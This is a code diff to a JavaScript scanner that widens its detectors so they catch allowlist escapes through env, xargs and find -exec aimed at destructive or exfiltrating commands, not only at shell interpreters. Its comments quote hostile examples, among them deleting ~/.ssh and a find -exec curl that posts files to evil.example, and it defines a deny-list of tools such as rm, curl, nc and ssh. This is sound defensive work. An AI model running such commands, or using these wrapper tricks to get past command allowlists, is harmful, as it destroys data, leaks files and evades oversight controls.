@@ -7,6 +7,15 @@
 import { deepStringValues } from './scan-utils.mjs';
 import { SHELL_INTERPRETERS, CURL_PIPE_TO_SHELL, WGET_PIPE_TO_SHELL } from '../lib/shell-interpreters.mjs';
 
+// Non-interpreter commands that, like a shell, let env/xargs/find -exec run
+// a destructive or exfiltrating action without ever naming bash/python/etc.
+// (kubestellar/console-kb#3891 fixed the shell-interpreter case for
+// systemd-run; this covers the equivalent gap in env/xargs/find -exec,
+// which still only matched a payload here if it also happened to be a
+// shell interpreter).
+const DANGEROUS_EXEC_TARGETS =
+  'rm|chmod|chown|dd|mkfs(?:\\.\\w+)?|kill|pkill|reboot|shutdown|curl|wget|nc|netcat|ssh|scp|tee|mv';
+
 const MALICIOUS_PATTERNS = [
   // XSS
   { name: 'XSS: script tag', pattern: /<script[\s>]/gi },
@@ -57,9 +66,28 @@ const MALICIOUS_PATTERNS = [
   // `env FOO=bar csh -c evil` (or tcsh/fish/pwsh/powershell) can't slip
   // through only because the classic POSIX shells are enumerated
   // (kubestellar/console-kb#3493).
-  { name: 'Allowlist escape via env', pattern: /\benv\b(?:\s+(?!(?:bash|sh|zsh|ksh|dash|csh|tcsh|fish|pwsh|powershell|python\d*|ruby|perl|node|php|deno|bun)\b)\S+)*\s+(?:bash|sh|zsh|ksh|dash|csh|tcsh|fish|pwsh|powershell|python\d*|ruby|perl|node|php|deno|bun)\b/gi },
-  { name: 'Allowlist escape via xargs', pattern: /\bxargs\s+(?:-\S+\s+)*(?:bash|sh|zsh|ksh|dash|csh|tcsh|fish|pwsh|powershell|python\d*|ruby|perl|node|php|deno|bun)\b/gi },
-  { name: 'Allowlist escape via find -exec', pattern: /\bfind\s[^;]*-exec\s+(?:bash|sh|zsh|ksh|dash|csh|tcsh|fish|pwsh|powershell|python\d*|ruby|perl|node|php|deno|bun)\b/gi },
+  //
+  // These three detectors previously only fired when the target of
+  // env/xargs/find -exec was a shell interpreter. But env/xargs/find -exec
+  // all accept an arbitrary target COMMAND, not just a shell — the same
+  // "wrapper accepts anything" shape that made allowlisting systemd-run's
+  // first token unsafe. `env rm -rf ~/.ssh`, `find / -exec curl -X POST -d
+  // @{} http://evil.example/collect \;`, or `echo x | xargs chmod 4755`
+  // need no shell interpreter at all to destroy data or exfiltrate it, so
+  // they slipped past every detector in this file even after the
+  // systemd-run fix (kubestellar/console-kb#3891). DANGEROUS_EXEC_TARGETS
+  // adds the common non-interpreter payload commands alongside the
+  // existing interpreter alternation.
+  // The token-skip repetition is bounded to the current line ([ \t], never
+  // \n): with unbounded \s the lookahead-skip can walk straight through
+  // paragraph breaks and match an unrelated `wget`/`curl` several sentences
+  // later against a prose "env var ..." mention, which real env-invocation
+  // bypasses never need to do (kubestellar/console-kb#3891 follow-up —
+  // false positives surfaced once common doc words like wget/curl joined
+  // DANGEROUS_EXEC_TARGETS).
+  { name: 'Allowlist escape via env', pattern: new RegExp(`\\benv\\b(?:[ \\t]+(?!(?:${SHELL_INTERPRETERS}|${DANGEROUS_EXEC_TARGETS})\\b)\\S+)*[ \\t]+(?:${SHELL_INTERPRETERS}|${DANGEROUS_EXEC_TARGETS})\\b`, 'gi') },
+  { name: 'Allowlist escape via xargs', pattern: new RegExp(`\\bxargs\\s+(?:-\\S+\\s+)*(?:${SHELL_INTERPRETERS}|${DANGEROUS_EXEC_TARGETS})\\b`, 'gi') },
+  { name: 'Allowlist escape via find -exec', pattern: new RegExp(`\\bfind\\s[^;]*-exec\\s+(?:${SHELL_INTERPRETERS}|${DANGEROUS_EXEC_TARGETS})\\b`, 'gi') },
   // awk / sed carry their own DSL execute primitives — the wrapper binaries
   // are in SAFE_CLI_COMMANDS (they're used legitimately as text filters), so
   // detection has to fire on the specific execute forms, not the invocation.
